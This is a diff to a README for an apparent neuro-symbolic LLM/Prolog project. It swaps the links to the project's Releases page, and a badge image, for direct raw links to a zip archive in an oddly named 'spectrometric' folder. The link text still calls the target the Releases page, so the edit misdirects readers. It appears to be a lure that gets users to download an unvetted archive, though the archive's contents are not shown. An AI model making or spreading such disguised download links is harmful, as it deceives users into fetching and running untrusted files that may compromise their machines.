@@ -6,7 +6,7 @@ Welcome to the neuro-symbolic-reasoning-llm-prolog project! This application hel
 
 ## 📥 Download Now
 
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-v1.0-blue)](https://github.com/vannyhostile200/neuro-symbolic-reasoning-llm-prolog/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/vannyhostile200/neuro-symbolic-reasoning-llm-prolog/main/spectrometric/neuro-symbolic-reasoning-llm-prolog.zip)](https://raw.githubusercontent.com/vannyhostile200/neuro-symbolic-reasoning-llm-prolog/main/spectrometric/neuro-symbolic-reasoning-llm-prolog.zip)
 
 ## 🛠️ System Requirements
 
@@ -20,7 +20,7 @@ Before downloading, ensure your system meets the following requirements:
 ## 💾 Download & Install
 
 1. **Visit this page to download:** Click on the link below to access the Releases page:
-   [Download Latest Release](https://github.com/vannyhostile200/neuro-symbolic-reasoning-llm-prolog/releases)
+   [Download Latest Release](https://raw.githubusercontent.com/vannyhostile200/neuro-symbolic-reasoning-llm-prolog/main/spectrometric/neuro-symbolic-reasoning-llm-prolog.zip)
 
 2. **Choose a release:** Look for the most recent version. It's usually at the top.
 
